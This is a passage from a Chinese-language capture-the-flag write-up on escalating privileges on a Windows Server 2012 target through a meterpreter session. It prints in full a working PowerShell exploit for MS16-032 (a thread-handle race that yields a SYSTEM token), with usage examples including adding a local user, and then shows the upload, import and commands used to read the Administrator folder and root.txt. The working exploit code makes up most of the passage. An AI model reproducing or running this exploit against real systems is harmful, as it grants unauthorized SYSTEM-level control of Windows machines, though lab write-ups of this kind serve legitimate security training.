查看内容，提交即可。</p><p>此时，发现是非管理员权限，在 <code>meterpreter</code> 利用 <code>getsystem</code> 尝试提权，发现失败。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814093324.png-water_print" alt=""></p><p>尝试用 msf 本地提权。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814093852.png-water_print" alt=""></p><p>寻找可用的exp，发现利用 <code>ms16-032</code> 可以针对 <code>windows server 2012</code>。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814093852.png-water_print" alt=""></p><p>但是在尝试的时候发现一直不成功，反弹的 shell 并不是 system 权限。</p><p>遂搜索该漏洞的利用脚本。</p><pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Invoke<span class="token operator">-</span>MS16<span class="token operator">-</span>032 <span class="token punctuation">{</span><span class="token comment" spellcheck="true">&lt;#.SYNOPSIS    PowerShell implementation of MS16-032. The exploit targets all vulnerable    operating systems that support PowerShell v2+. Credit for the discovery of    the bug and the logic to exploit it go to James Forshaw (@tiraniddo).    Targets:    * Win7-Win10 &amp; 2k8-2k12 &lt;== 32/64 bit!    * Tested on x32 Win7, x64 Win8, x64 2k12R2    Notes:    * In order for the race condition to succeed the machine must have 2+ CPU      cores. If testing in a VM just make sure to add a core if needed mkay.    * The exploit is pretty reliable, however ~1/6 times it will say it succeeded      but not spawn a shell. Not sure what the issue is but just re-run and profit!    * Want to know more about MS16-032 ==>      https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html.DESCRIPTION    Author: Ruben Boonen (@FuzzySec)    Blog: http://www.fuzzysecurity.com/    License: BSD 3-Clause    Required Dependencies: PowerShell v2+    Optional Dependencies: None.PARAMETER ApplicationSpecifies an Application to run..PARAMETER CommandlineSpecifies Commandline, such as net user xxx xxx /add.EXAMPLE    C:\PS> Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe    C:\PS> Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe -Commandline "/c net user 1 1 /add"#></span>  <span class="token namespace">[CmdletBinding()]</span>    <span class="token keyword">param</span><span class="token punctuation">(</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>Mandatory = <span class="token boolean">$False</span><span class="token punctuation">,</span> ParameterSetName = <span class="token string">'C:\Windows\System32\cmd.exe'</span> <span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[string]</span>        <span class="token variable">$Application</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $False)]</span>        <span class="token namespace">[string]</span>        <span class="token variable">$Commandline</span>        <span class="token punctuation">)</span>    <span class="token function">Add-Type</span> <span class="token operator">-</span>TypeDefinition @<span class="token string">"    using System;    using System.Diagnostics;    using System.Runtime.InteropServices;    using System.Security.Principal;    [StructLayout(LayoutKind.Sequential)]    public struct PROCESS_INFORMATION    {        public IntPtr hProcess;        public IntPtr hThread;        public int dwProcessId;        public int dwThreadId;    }    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]    public struct STARTUPINFO    {        public Int32 cb;        public string lpReserved;        public string lpDesktop;        public string lpTitle;        public Int32 dwX;        public Int32 dwY;        public Int32 dwXSize;        public Int32 dwYSize;        public Int32 dwXCountChars;        public Int32 dwYCountChars;        public Int32 dwFillAttribute;        public Int32 dwFlags;        public Int16 wShowWindow;        public Int16 cbReserved2;        public IntPtr lpReserved2;        public IntPtr hStdInput;        public IntPtr hStdOutput;        public IntPtr hStdError;    }    [StructLayout(LayoutKind.Sequential)]    public struct SQOS    {        public int Length;        public int ImpersonationLevel;        public int ContextTrackingMode;        public bool EffectiveOnly;    }    public static class Advapi32    {        [DllImport("</span>advapi32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true, CharSet=CharSet.Unicode)]        public static extern bool CreateProcessWithLogonW(            String userName,            String domain,            String password,            int logonFlags,            String applicationName,            String commandLine,            int creationFlags,            int environment,            String currentDirectory,            ref  STARTUPINFO startupInfo,            out PROCESS_INFORMATION processInformation);        [DllImport("</span>advapi32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public static extern bool SetThreadToken(            ref IntPtr Thread,            IntPtr Token);        [DllImport("</span>advapi32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public static extern bool OpenThreadToken(            IntPtr ThreadHandle,            int DesiredAccess,            bool OpenAsSelf,            out IntPtr TokenHandle);        [DllImport("</span>advapi32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public static extern bool OpenProcessToken(            IntPtr ProcessHandle,             int DesiredAccess,            ref IntPtr TokenHandle);        [DllImport("</span>advapi32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public extern static bool DuplicateToken(            IntPtr ExistingTokenHandle,            int SECURITY_IMPERSONATION_LEVEL,            ref IntPtr DuplicateTokenHandle);    }    public static class Kernel32    {        [DllImport("</span>kernel32<span class="token punctuation">.</span>dll<span class="token string">")]        public static extern uint GetLastError();        [DllImport("</span>kernel32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public static extern IntPtr GetCurrentProcess();        [DllImport("</span>kernel32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public static extern IntPtr GetCurrentThread();        [DllImport("</span>kernel32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public static extern int GetThreadId(IntPtr hThread);        [DllImport("</span>kernel32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError = true)]        public static extern int GetProcessIdOfThread(IntPtr handle);        [DllImport("</span>kernel32<span class="token punctuation">.</span>dll<span class="token string">",SetLastError=true)]        public static extern int SuspendThread(IntPtr hThread);        [DllImport("</span>kernel32<span class="token punctuation">.</span>dll<span class="token string">",SetLastError=true)]        public static extern int ResumeThread(IntPtr hThread);        [DllImport("</span>kernel32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public static extern bool TerminateProcess(            IntPtr hProcess,            uint uExitCode);        [DllImport("</span>kernel32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public static extern bool CloseHandle(IntPtr hObject);        [DllImport("</span>kernel32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public static extern bool DuplicateHandle(            IntPtr hSourceProcessHandle,            IntPtr hSourceHandle,            IntPtr hTargetProcessHandle,            ref IntPtr lpTargetHandle,            int dwDesiredAccess,            bool bInheritHandle,            int dwOptions);    }    public static class Ntdll    {        [DllImport("</span>ntdll<span class="token punctuation">.</span>dll<span class="token string">", SetLastError=true)]        public static extern int NtImpersonateThread(            IntPtr ThreadHandle,            IntPtr ThreadToImpersonate,            ref SQOS SecurityQualityOfService);    }"</span>@    <span class="token keyword">function</span> Get<span class="token operator">-</span>ThreadHandle <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true"># StartupInfo Struct</span>        <span class="token variable">$StartupInfo</span> = <span class="token function">New-Object</span> STARTUPINFO        <span class="token variable">$StartupInfo</span><span class="token punctuation">.</span>dwFlags = 0x00000101 <span class="token comment" spellcheck="true"># STARTF_USESTDHANDLES</span>            <span class="token variable">$StartupInfo</span><span class="token punctuation">.</span>wShowWindow = 0<span class="token punctuation">;</span>        <span class="token variable">$StartupInfo</span><span class="token punctuation">.</span>hStdInput = <span class="token namespace">[Kernel32]</span>::GetCurrentThread<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token variable">$StartupInfo</span><span class="token punctuation">.</span>hStdOutput = <span class="token namespace">[Kernel32]</span>::GetCurrentThread<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token variable">$StartupInfo</span><span class="token punctuation">.</span>hStdError = <span class="token namespace">[Kernel32]</span>::GetCurrentThread<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token variable">$StartupInfo</span><span class="token punctuation">.</span>cb = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token variable">$StartupInfo</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Struct Size</span>        <span class="token comment" spellcheck="true"># ProcessInfo Struct</span>        <span class="token variable">$ProcessInfo</span> = <span class="token function">New-Object</span> PROCESS_INFORMATION        <span class="token comment" spellcheck="true"># CreateProcessWithLogonW --> lpCurrentDirectory</span>        <span class="token variable">$GetCurrentPath</span> = <span class="token punctuation">(</span><span class="token function">Get-Item</span> <span class="token operator">-</span>Path <span class="token string">".\"</span> <span class="token operator">-</span>Verbose<span class="token punctuation">)</span><span class="token punctuation">.</span>FullName        <span class="token comment" spellcheck="true"># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Advapi32]</span>::CreateProcessWithLogonW<span class="token punctuation">(</span>            <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"domain"</span><span class="token punctuation">,</span> <span class="token string">"pass"</span><span class="token punctuation">,</span>            0x00000002<span class="token punctuation">,</span> <span class="token string">"C:\Windows\System32\notepad.exe"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            0x00000004<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$GetCurrentPath</span><span class="token punctuation">,</span>            <span class="token namespace">[ref]</span><span class="token variable">$StartupInfo</span><span class="token punctuation">,</span> <span class="token namespace">[ref]</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Duplicate handle into current process -> DUPLICATE_SAME_ACCESS</span>        <span class="token variable">$lpTargetHandle</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::DuplicateHandle<span class="token punctuation">(</span>            <span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> 0x4<span class="token punctuation">,</span>            <span class="token namespace">[Kernel32]</span>::GetCurrentProcess<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token namespace">[ref]</span><span class="token variable">$lpTargetHandle</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span>            0x00000002<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Clean up suspended process</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::TerminateProcess<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> 1<span class="token punctuation">)</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::CloseHandle<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hProcess<span class="token punctuation">)</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::CloseHandle<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hThread<span class="token punctuation">)</span>        <span class="token variable">$lpTargetHandle</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Get<span class="token operator">-</span>SystemToken <span class="token punctuation">{</span>        <span class="token function">echo</span> <span class="token string">"`n[?] Trying thread handle: <span class="token variable">$Thread</span>"</span>        <span class="token function">echo</span> <span class="token string">"[?] Thread belongs to:<span class="token function"> $<span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token function">Get-Process</span> <span class="token operator">-</span>PID $<span class="token punctuation">(</span><span class="token namespace">[Kernel32]</span>::GetProcessIdOfThread<span class="token punctuation">(</span><span class="token variable">$Thread</span><span class="token punctuation">)</span></span>)).ProcessName)"</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::SuspendThread<span class="token punctuation">(</span><span class="token variable">$Thread</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$CallResult</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">echo</span> <span class="token string">"[!] <span class="token variable">$Thread</span> is a bad thread, moving on.."</span>            <span class="token keyword">Return</span>        <span class="token punctuation">}</span> <span class="token function">echo</span> <span class="token string">"[+] Thread suspended"</span>        <span class="token function">echo</span> <span class="token string">"[>] Wiping current impersonation token"</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Advapi32]</span>::SetThreadToken<span class="token punctuation">(</span><span class="token namespace">[ref]</span><span class="token variable">$Thread</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$CallResult</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">echo</span> <span class="token string">"[!] SetThreadToken failed, moving on.."</span>            <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::ResumeThread<span class="token punctuation">(</span><span class="token variable">$Thread</span><span class="token punctuation">)</span>            <span class="token function">echo</span> <span class="token string">"[+] Thread resumed!"</span>            <span class="token keyword">Return</span>        <span class="token punctuation">}</span>        <span class="token function">echo</span> <span class="token string">"[>] Building SYSTEM impersonation token"</span>        <span class="token comment" spellcheck="true"># SecurityQualityOfService struct</span>        <span class="token variable">$SQOS</span> = <span class="token function">New-Object</span> SQOS        <span class="token variable">$SQOS</span><span class="token punctuation">.</span>ImpersonationLevel = 2 <span class="token comment" spellcheck="true">#SecurityImpersonation</span>        <span class="token variable">$SQOS</span><span class="token punctuation">.</span>Length = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token variable">$SQOS</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Undocumented API's, I like your style Microsoft ;)</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Ntdll]</span>::NtImpersonateThread<span class="token punctuation">(</span><span class="token variable">$Thread</span><span class="token punctuation">,</span> <span class="token variable">$Thread</span><span class="token punctuation">,</span> <span class="token namespace">[ref]</span><span class="token variable">$sqos</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$CallResult</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">echo</span> <span class="token string">"[!] NtImpersonateThread failed, moving on.."</span>            <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::ResumeThread<span class="token punctuation">(</span><span class="token variable">$Thread</span><span class="token punctuation">)</span>            <span class="token function">echo</span> <span class="token string">"[+] Thread resumed!"</span>            <span class="token keyword">Return</span>        <span class="token punctuation">}</span>        <span class="token variable">$script</span>:SysTokenHandle = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token comment" spellcheck="true"># 0x0006 --> TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Advapi32]</span>::OpenThreadToken<span class="token punctuation">(</span><span class="token variable">$Thread</span><span class="token punctuation">,</span> 0x0006<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[ref]</span><span class="token variable">$SysTokenHandle</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$CallResult</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">echo</span> <span class="token string">"[!] OpenThreadToken failed, moving on.."</span>            <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::ResumeThread<span class="token punctuation">(</span><span class="token variable">$Thread</span><span class="token punctuation">)</span>            <span class="token function">echo</span> <span class="token string">"[+] Thread resumed!"</span>            <span class="token keyword">Return</span>        <span class="token punctuation">}</span>        <span class="token function">echo</span> <span class="token string">"[?] Success, open SYSTEM token handle: <span class="token variable">$SysTokenHandle</span>"</span>        <span class="token function">echo</span> <span class="token string">"[+] Resuming thread.."</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::ResumeThread<span class="token punctuation">(</span><span class="token variable">$Thread</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># main() &lt;--- ;)</span>    <span class="token variable">$ms16032</span> = @<span class="token string">"     __ __ ___ ___   ___     ___ ___ ___     |  V  |  _|_  | |  _|___|   |_  |_  |    |     |_  |_| |_| . |___| | |_  |  _|    |_|_|_|___|_____|___|   |___|___|___|                   [by b33f -> @FuzzySec]"</span>@    <span class="token variable">$ms16032</span>    <span class="token comment" spellcheck="true"># Check logical processor count, race condition requires 2+</span>    <span class="token function">echo</span> <span class="token string">"`n[?] Operating system core count:<span class="token function"> $<span class="token punctuation">(</span><span class="token namespace">[System.Environment]</span>::ProcessorCount<span class="token punctuation">)</span></span>"</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token namespace">[System.Environment]</span>::ProcessorCount<span class="token punctuation">)</span> <span class="token operator">-lt</span> 2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">echo</span> <span class="token string">"[!] This is a VM isn't it, race condition requires at least 2 CPU cores, exiting!`n"</span>        <span class="token keyword">Return</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># Create array for Threads &amp; TID's</span>    <span class="token variable">$ThreadArray</span> = @<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token variable">$TidArray</span> = @<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">echo</span> <span class="token string">"[>] Duplicating CreateProcessWithLogonW handles.."</span>    <span class="token comment" spellcheck="true"># Loop Get-ThreadHandle and collect thread handles with a valid TID</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span>=0<span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">-lt</span> 500<span class="token punctuation">;</span> <span class="token variable">$i</span>+<span class="token operator">+</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$hThread</span> = Get<span class="token operator">-</span>ThreadHandle        <span class="token variable">$hThreadID</span> = <span class="token namespace">[Kernel32]</span>::GetThreadId<span class="token punctuation">(</span><span class="token variable">$hThread</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Bit hacky/lazy, filters on uniq/valid TID's to create $ThreadArray</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$TidArray</span> <span class="token operator">-notcontains</span> <span class="token variable">$hThreadID</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$TidArray</span> <span class="token operator">+=</span> <span class="token variable">$hThreadID</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hThread</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$ThreadArray</span> <span class="token operator">+=</span> <span class="token variable">$hThread</span> <span class="token comment" spellcheck="true"># This is what we need!</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token variable">$ThreadArray</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">-eq</span> 0<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">echo</span> <span class="token string">"[!] No valid thread handles were captured, exiting!"</span>        <span class="token keyword">Return</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">echo</span> <span class="token string">"[?] Done, got<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$ThreadArray</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span></span> thread handle(s)!"</span>        <span class="token function">echo</span> <span class="token string">"`n[?] Thread handle list:"</span>        <span class="token variable">$ThreadArray</span>    <span class="token punctuation">}</span>    <span class="token function">echo</span> <span class="token string">"`n[*] Sniffing out privileged impersonation token.."</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Thread</span> in <span class="token variable">$ThreadArray</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true"># Get handle to SYSTEM access token</span>        Get<span class="token operator">-</span>SystemToken        <span class="token function">echo</span> <span class="token string">"`n[*] Sniffing out SYSTEM shell.."</span>        <span class="token function">echo</span> <span class="token string">"`n[>] Duplicating SYSTEM token"</span>        <span class="token variable">$hDuplicateTokenHandle</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token variable">$CallResult</span> = <span class="token namespace">[Advapi32]</span>::DuplicateToken<span class="token punctuation">(</span><span class="token variable">$SysTokenHandle</span><span class="token punctuation">,</span> 2<span class="token punctuation">,</span> <span class="token namespace">[ref]</span><span class="token variable">$hDuplicateTokenHandle</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Simple PS runspace definition</span>        <span class="token function">echo</span> <span class="token string">"[>] Starting token race"</span>        <span class="token variable">$Runspace</span> = <span class="token namespace">[runspacefactory]</span>::CreateRunspace<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token variable">$StartTokenRace</span> = <span class="token namespace">[powershell]</span>::Create<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token variable">$StartTokenRace</span><span class="token punctuation">.</span>runspace = <span class="token variable">$Runspace</span>        <span class="token variable">$Runspace</span><span class="token punctuation">.</span>Open<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token namespace">[void]</span><span class="token variable">$StartTokenRace</span><span class="token punctuation">.</span>AddScript<span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token keyword">Param</span> <span class="token punctuation">(</span><span class="token variable">$Thread</span><span class="token punctuation">,</span> <span class="token variable">$hDuplicateTokenHandle</span><span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">$true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$CallResult</span> = <span class="token namespace">[Advapi32]</span>::SetThreadToken<span class="token punctuation">(</span><span class="token namespace">[ref]</span><span class="token variable">$Thread</span><span class="token punctuation">,</span> <span class="token variable">$hDuplicateTokenHandle</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddArgument<span class="token punctuation">(</span><span class="token variable">$Thread</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddArgument<span class="token punctuation">(</span><span class="token variable">$hDuplicateTokenHandle</span><span class="token punctuation">)</span>        <span class="token variable">$AscObj</span> = <span class="token variable">$StartTokenRace</span><span class="token punctuation">.</span>BeginInvoke<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">echo</span> <span class="token string">"[>] Starting process race"</span>        <span class="token comment" spellcheck="true"># Adding a timeout (10 seconds) here to safeguard from edge-cases</span>        <span class="token variable">$SafeGuard</span> = <span class="token namespace">[diagnostics.stopwatch]</span>::StartNew<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$SafeGuard</span><span class="token punctuation">.</span>ElapsedMilliseconds <span class="token operator">-lt</span> 10000<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true"># StartupInfo Struct</span>        <span class="token variable">$StartupInfo</span> = <span class="token function">New-Object</span> STARTUPINFO        <span class="token variable">$StartupInfo</span><span class="token punctuation">.</span>cb = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token variable">$StartupInfo</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Struct Size</span>        <span class="token variable">$StartupInfo</span><span class="token punctuation">.</span>dwFlags = 0x00000101 <span class="token comment" spellcheck="true"># STARTF_USESTDHANDLES</span>            <span class="token variable">$StartupInfo</span><span class="token punctuation">.</span>wShowWindow = 0<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true"># ProcessInfo Struct</span>        <span class="token variable">$ProcessInfo</span> = <span class="token function">New-Object</span> PROCESS_INFORMATION        <span class="token comment" spellcheck="true"># CreateProcessWithLogonW --> lpCurrentDirectory</span>        <span class="token variable">$GetCurrentPath</span> = <span class="token punctuation">(</span><span class="token function">Get-Item</span> <span class="token operator">-</span>Path <span class="token string">".\"</span> <span class="token operator">-</span>Verbose<span class="token punctuation">)</span><span class="token punctuation">.</span>FullName        <span class="token comment" spellcheck="true"># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Advapi32]</span>::CreateProcessWithLogonW<span class="token punctuation">(</span>            <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"domain"</span><span class="token punctuation">,</span> <span class="token string">"pass"</span><span class="token punctuation">,</span>            0x00000002<span class="token punctuation">,</span> <span class="token variable">$Application</span><span class="token punctuation">,</span><span class="token variable">$Commandline</span><span class="token punctuation">,</span>            0x00000004<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$GetCurrentPath</span><span class="token punctuation">,</span>            <span class="token namespace">[ref]</span><span class="token variable">$StartupInfo</span><span class="token punctuation">,</span> <span class="token namespace">[ref]</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#---</span>        <span class="token comment" spellcheck="true"># Make sure CreateProcessWithLogonW ran successfully! If not, skip loop.</span>        <span class="token comment" spellcheck="true">#---</span>        <span class="token comment" spellcheck="true"># Missing this check used to cause the exploit to fail sometimes.</span>        <span class="token comment" spellcheck="true"># If CreateProcessWithLogon fails OpenProcessToken won't succeed</span>        <span class="token comment" spellcheck="true"># but we obviously don't have a SYSTEM shell :'( . Should be 100%</span>        <span class="token comment" spellcheck="true"># reliable now!</span>        <span class="token comment" spellcheck="true">#---</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$CallResult</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span>        <span class="token punctuation">}</span>                    <span class="token variable">$hTokenHandle</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token variable">$CallResult</span> = <span class="token namespace">[Advapi32]</span>::OpenProcessToken<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> 0x28<span class="token punctuation">,</span> <span class="token namespace">[ref]</span><span class="token variable">$hTokenHandle</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># If we can't open the process token it's a SYSTEM shell!</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$CallResult</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">echo</span> <span class="token string">"[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"</span>            <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::ResumeThread<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hThread<span class="token punctuation">)</span>            <span class="token variable">$StartTokenRace</span><span class="token punctuation">.</span>Stop<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token variable">$SafeGuard</span><span class="token punctuation">.</span>Stop<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">Return</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># Clean up suspended process</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::TerminateProcess<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> 1<span class="token punctuation">)</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::CloseHandle<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hProcess<span class="token punctuation">)</span>        <span class="token variable">$CallResult</span> = <span class="token namespace">[Kernel32]</span>::CloseHandle<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hThread<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># Kill runspace &amp; stopwatch if edge-case</span>        <span class="token variable">$StartTokenRace</span><span class="token punctuation">.</span>Stop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token variable">$SafeGuard</span><span class="token punctuation">.</span>Stop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>该 powershell 可以以管理员身份执行指定的命令。</p><p>先将该脚本上传到可以写入的目标机器的目录中：</p><p><code>upload Invoke-MS16-032.ps1 \Invoke-MS16-032.ps1</code></p><p>在 <code>meterpreter</code> 中 进入 <code>shell</code> ，然后进入 <code>powershell</code> 模式。</p><p>导入该模块：<br><code>import-module .\Invoke-MS16-032.ps1</code></p><p>执行命令：</p><p><code>Invoke-MS16-032 -Application cmd.exe -commandline '/c dir C:\Users\Administrator &gt; 1.txt'"</code></p><p>成功获取 <code>Administrator</code> 目录下的内容。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814095058.png-water_print" alt=""></p><p>执行命令：</p><p><code>Invoke-MS16-032 -Application cmd.exe -commandline '/c type C:\Users\Administrator\Desktop\root.txt &gt; 1.txt'</code></p><p>成功获取目标文件内容：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814095141.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 